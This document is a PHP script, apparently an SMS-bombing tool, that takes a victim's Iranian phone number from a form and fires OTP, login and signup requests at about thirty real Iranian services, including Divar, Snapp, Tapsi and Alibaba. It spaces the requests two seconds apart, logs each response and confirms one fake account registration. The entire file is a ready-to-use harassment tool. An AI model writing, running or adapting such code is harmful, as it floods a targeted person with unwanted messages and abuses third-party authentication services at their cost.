<?php
set_time_limit(300);
if (isset($_POST['phone'])) {
    if (preg_match("/^([0][9][0-9]{9})$/", $_POST['phone'])) {
        $phone = $_POST['phone'];
        all($phone);
        header("Location:index.php?ok=true");
    } else {
        header("Location:index.php?number=0");
    }
}
function all($phone)
{
    divar($phone);
    nobatir($phone);
    alopeyk_login($phone); // Depends on user status
    alopeyk_signup($phone); // Depends on user status
    shahrefarsh($phone);
    digistyle($phone); // Depends on user status
    snapp_express($phone);
    azki($phone);
    digikala_jet($phone);
    snapp_drivers($phone);
    ostadkar($phone);
    miare($phone);
    tapsi_drivers($phone);
    tapsi_passenger($phone);
    banimode($phone);
    taaghche_login($phone);
    taaghche_signup($phone);
    mobit($phone);
    jabama($phone);
    ghabzino($phone);
    komodaa($phone);
    barghe_man($phone);
    vandar($phone);
    pinorest($phone);
    tetherland($phone);
    alibaba($phone);
    drdr($phone);
    drnext($phone);
    classino($phone);
    takshopaccessorise($phone);
}


function generateRandomString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}

function CURL_SMS($URL, $PHONE_VALUE, $HEADER1 = NULL, $HEADER2 = NULL): void
{
    global $response;
    date_default_timezone_set("Asia/Tehran");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $URL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    if ($HEADER1 != NULL) {
        if ($HEADER2 != NULL) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                $HEADER1, $HEADER2
            ]);
        } else {
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                $HEADER1
            ]);
        }
    }
    curl_setopt($ch, CURLOPT_POSTFIELDS, $PHONE_VALUE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    $response = curl_exec($ch);
    file_put_contents('log.txt', '[' . date("Y-m-d h:i:sa") . '--URL=' . $URL . ']' . $response . "\n\n", FILE_APPEND);
    curl_close($ch);
    sleep(2);

}

function divar($phone)
{
    $url = 'https://api.divar.ir/v5/auth/authenticate';
    $phone_value = '{"phone":"' . $phone . '"}';
    CURL_SMS($url, $phone_value);
}

function nobatir($phone)
{
    $url = 'https://nobat.ir/api/public/patient/login/phone';
    $phone_value = "------WebKitFormBoundary5wscOwxMqnICoiZY\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n" . $phone . "\r\n------WebKitFormBoundary5wscOwxMqnICoiZY--\r\n";
    $header = 'content-type: multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY';
    CURL_SMS($url, $phone_value, $header);
}

function alopeyk_login($phone)
{
    $phone = (int)$phone;  // Removes Zero from the beginning of the number
    $url = 'https://api.alopeyk.com/api/v2/login?platform=pwa';
    $phone_value = '{"type":"CUSTOMER","model":"Chrome 111.0.0.0","platform":"pwa","version":"10","manufacturer":"Windows","isVirtual":false,"serial":true,"app_version":"1.2.9","uuid":true,"phone":" ' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function alopeyk_signup($phone)
{
    $url = 'https://api.alopeyk.com/api/v2/register-customer?platform=pwa';
    $phone_value = "{\"type\":\"CUSTOMER\",\"model\":\"Chrome 111.0.0.0\",\"platform\":\"pwa\",\"version\":\"10\",\"manufacturer\":\"Windows\",\"isVirtual\":false,\"serial\":true,\"app_version\":\"1.2.9\",\"uuid\":true,\"firstname\":\"تست\",\"lastname\":\"تست\",\"phone\":\"" . $phone . "\",\"email\":\"\",\"referred_by\":\"\",\"lat\":null,\"lng\":null}";
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function shahrefarsh($phone)
{
    $url = 'https://shahrfarsh.com/Account/Login';
    $phone_value = 'phoneNumber=' . $phone;
    CURL_SMS($url, $phone_value);
}

function digistyle($phone)
{
    global $response;
    $url = 'https://www.digistyle.com/users/login-register/';
    $phone_value = 'loginRegister%5Bemail_phone%5D=' . $phone;
    CURL_SMS($url, $phone_value);
    $token = preg_match('/(?<=token=)(.*)(?=&amp)/', $response, $tok);
    file_get_contents('https://www.digistyle.com/users/register/confirm/?token=' . $tok[0] . '&type=register');
}

function snapp_express($phone)
{
    $url = 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=52f02dbc&optionalVersion=5.6.6&UDID=fb000c1a-41a6-4059-8e22-7fb820e6942b';
    $phone_value = 'cellphone=' . $phone . '&captcha=&optionalLoginToken=true&local=';
    CURL_SMS($url, $phone_value);
}

function azki($phone)
{
    $url = 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/';
    $phone_value = '{"phoneNumber":"' . $phone . '"}';
    $header1 = 'content-type: application/json';
    $header2 = 'deviceid: 6';
    CURL_SMS($url, $phone_value, $header1, $header2);
}


function digikala_jet($phone)
{
    $url = 'https://api.digikalajet.ir/user/login-register/';
    $phone_value = '{"phone":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function snapp_drivers($phone)
{
    $url = 'https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=';
    $phone_value = '{"cellphone":"' . $phone . '"}';
    CURL_SMS($url, $phone_value);
}


function ostadkar($phone)
{
    $url = 'https://api.ostadkr.com/login';
    $phone_value = '{"mobile":"' . $phone . '"}';
    CURL_SMS($url, $phone_value);
}

function miare($phone)
{
    $url = 'https://www.miare.ir/api/otp/driver/request/';
    $phone_value = '{"phone_number":"' . $phone . '"}';
    $header = 'Content-Type: application/json;charset=UTF-8';
    CURL_SMS($url, $phone_value, $header);
}

function tapsi_drivers($phone)
{
    $url = 'https://api.tapsi.ir/api/v2.2/user';
    $phone_value = '{"credential":{"phoneNumber":"' . $phone . '","role":"DRIVER"},"otpOption":"SMS"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function tapsi_passenger($phone)
{
    $url = 'https://api.tapsi.ir/api/v2.2/user';
    $phone_value = '{"credential":{"phoneNumber":"' . $phone . '","role":"PASSENGER"},"otpOption":"SMS"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function banimode($phone)
{
    $url = 'https://mobapi.banimode.com/api/v2/auth/request';
    $phone_value = '{"phone":"' . $phone . '"}';
    $header = 'Content-Type: application/json;charset=UTF-8';
    CURL_SMS($url, $phone_value, $header);
}

function drdr($phone)
{
    $url = 'https://drdr.ir/api/v3/auth/login/mobile/init';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header1 = 'content-type: application/json';
    $header2 = 'client-id: f60d5037-b7ac-404a-9e3a-a263fd9f8054';
    CURL_SMS($url, $phone_value, $header1, $header2);
}

function taaghche_login($phone)
{
    $url = 'https://gw.taaghche.com/v4/site/auth/login';
    $phone_value = '{"contact":"' . $phone . '","forceOtp":false}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function taaghche_signup($phone)
{
    $url = 'https://gw.taaghche.com/v4/site/auth/signup';
    $phone_value = '{"contact":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function komodaa($phone)
{
    $url = 'https://api.komodaa.com/api/v2.6/loginRC/request';
    $phone_value = '{"phone_number":"' . $phone . '"}';
    $header = 'Content-Type: application/json';
    CURL_SMS($url, $phone_value, $header);
}


function ghabzino($phone)
{
    $url = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode';
    $phone_value = '{"Parameters":{"ApplicationType":"Web","ApplicationUniqueToken":null,"ApplicationVersion":"1.0.0","MobileNumber":"' . $phone . '","UniqueToken":null}}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function barghe_man($phone)
{
    $url = 'https://uiapi2.saapa.ir/api/otp/sendCode';
    $phone_value = '{"mobile":"' . $phone . '","from_meter_buy":false}';
    CURL_SMS($url, $phone_value);
}

function vandar($phone)
{
    $url = 'https://api.vandar.io/account/v1/check/mobile';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function mobit($phone)
{
    $url = 'https://api.mobit.ir/api/web/v8/register/register';
    $phone_value = '{"number":"' . $phone . '"}';
    $header = 'content-type: application/json;charset=UTF-8';
    CURL_SMS($url, $phone_value, $header);
}

function jabama($phone)
{
    $url = 'https://taraazws.jabama.com/api/v4/account/send-code';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header = 'Content-Type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function pinorest($phone)
{
    $url = 'https://api.pinorest.com/frontend/auth/login/mobile';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}


function tetherland($phone)
{
    $url = 'https://service.tetherland.com/api/v5/login-register';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function alibaba($phone)
{
    $url = 'https://ws.alibaba.ir/api/v3/account/mobile/otp';
    $phone_value = '{"phoneNumber":"' . $phone . '"}';
    $header = 'Content-Type: application/json';
    CURL_SMS($url, $phone_value, $header);
}

function drnext($phone)
{
    $url = 'https://cyclops.drnext.ir/v1/patients/auth/send-verification-token';
    $phone_values = '{"source":"besina","mobile":"' . $phone . '"}';
    $header = 'content-type: application/json';
    CURL_SMS($url, $phone_values, $header);
}


function classino($phone)
{
    $url = 'https://student.classino.com/otp/v1/api/login';
    $phone_value = '{"mobile":"' . $phone . '"}';
    $heaedr = 'Content-Type: application/json';
    CURL_SMS($url, $phone_value, $heaedr);
}

function takshopaccessorise($phone)
{
    $url = 'https://takshopaccessorise.ir/api/v1/sessions/login_request';
    $phone_value = '{"mobile_phone":"' . $phone . '"}';
    $header = 'content-type: application/json;charset=UTF-8';
    CURL_SMS($url, $phone_value, $header);
}